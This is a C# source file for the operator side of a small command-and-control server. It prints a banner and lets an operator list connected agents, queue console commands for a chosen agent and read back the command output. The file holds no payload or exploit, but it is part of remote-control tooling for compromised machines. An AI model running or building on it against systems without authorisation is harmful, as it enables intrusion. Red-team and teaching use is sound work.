using System;
using System.Collections.Generic;
using Spectre.Console;
using System.Threading.Tasks;

namespace server{
    public class UserInput{
        //Main class for C2 Operator input
        public Listener listener {get; set;}

        public UserInput(Listener listener){
            //pass our listener into this object
            this.listener = listener;
            Console.WriteLine(@"
_________         _________ _               ______   _______ 
\__   __/|\     /|\__   __/( (    /|       (  __  \ (  ____ )
   ) (   | )   ( |   ) (   |  \  ( |       | (  \  )| (    )|
   | |   | (___) |   | |   |   \ | | _____ | |   ) || (____)|
   | |   |  ___  |   | |   | (\ \) |(_____)| |   | ||     __)
   | |   | (   ) |   | |   | | \   |       | |   ) || (\ (   
   | |   | )   ( |___) (___| )  \  |       | (__/  )| ) \ \__
   )_(   |/     \|\_______/|/    )_)       (______/ |/   \__/
                                                             
            ");
        }

        private string Menu(){
            //returns a menu
            //should be made generic and with input
            //in the constructor *theoretically*

            //the following are modified from Spectre Console docs
            // https://spectreconsole.net/widgets/table
            // https://spectreconsole.net/prompts/selection
            // Create a table
            var menuOptions = new Table();

            // Add some columns
            menuOptions.AddColumn("#");
            menuOptions.AddColumn(new TableColumn("Command"));

            // Add some rows
            menuOptions.AddRow("1","[red]Exit[/]");
            menuOptions.AddRow("2","[blue]List all Clients[/]");
            menuOptions.AddRow("3","[green]Run a Console Command[/]");
            menuOptions.AddRow("4","[purple]View Responses[/]");

            // Render the tables to the console
            AnsiConsole.Write(menuOptions);
            // added a prompt for the menu
            var prompt = AnsiConsole.Prompt(
                new SelectionPrompt<string>()
                    .Title("What would you like to do?")
                    .PageSize(10)
                    .AddChoices(new[] {
                        "Exit", "List Clients", "Run a Console Command", "View Responses"
                }));
            return prompt;
        }

        public void MenuInput(){
            //User input for the server
            //Menu Backend
            bool menuLoop = true;
            while(menuLoop){
                string input = Menu();
                switch(input){
                    case "Exit":
                        //exiting our loop here will terminate the server
                        menuLoop = false;
                        break;
                    case "List Clients":
                        var clients = new Table();
                        clients.AddColumn("Registered Clients");
                        foreach(var agent in ListClients()){
                            clients.AddRow(agent);
                        }
                        AnsiConsole.Write(clients);
                        break;
                    case "Run a Console Command":
                        SetCommand();
                        break;
                    case "View Responses":
                        var comT = new Table();
                        ViewResponses();
                        break;
                    default: 
                        Console.WriteLine("\nInvalid input; Please try again.");
                        break;
                }
            }
        }
        public string[] ListClients(){
            //Converts client list to a string array
            //List<Agent> agents = this.listener.agents;
            //var enum = this.listener.agents.GetEnumerator();
            var agents = this.listener.agents;
            string[] agentArr = new string[agents.Count];
            int count = 0;
            foreach (var agent in agents){
                agentArr[count] = agent.Key;
                count++;
            }
            return agentArr;
        }

        public int SetCommand(){
            //set a command for a client to query
            var prompt = AnsiConsole.Prompt(
                new SelectionPrompt<string>()
                    .Title("Select the client you would like to send a command to")
                    .PageSize(10)
                    .AddChoices(ListClients())
            );
            if(this.listener.agents.TryGetValue(prompt, out Agent agent)){
                var command = AnsiConsole.Ask<string>("Enter the console [red]command to run:[/] ");
                agent.commandQue.AddLast(command);
                Console.WriteLine("\n");
                return 0;
            }
            
            return 1;
        }

        public List<string> ViewResponses(){
            //return responses sent by each client
            var prompt = AnsiConsole.Prompt(
                new SelectionPrompt<string>()
                    .Title("Select the client you'd like to see responses from")
                    .PageSize(10)
                    .AddChoices(ListClients())
            );
            if(this.listener.agents.TryGetValue(prompt, out Agent agent)){
                AnsiConsole.Markup($"Responses from [red]{agent.name}[/]:\n");
                foreach(var com in agent.commandResp){
                    Console.WriteLine(com);
                }
                Console.WriteLine("\n");
            }
            //return an empty list if the agent is not found
            return new List<string>();
        }
    }
}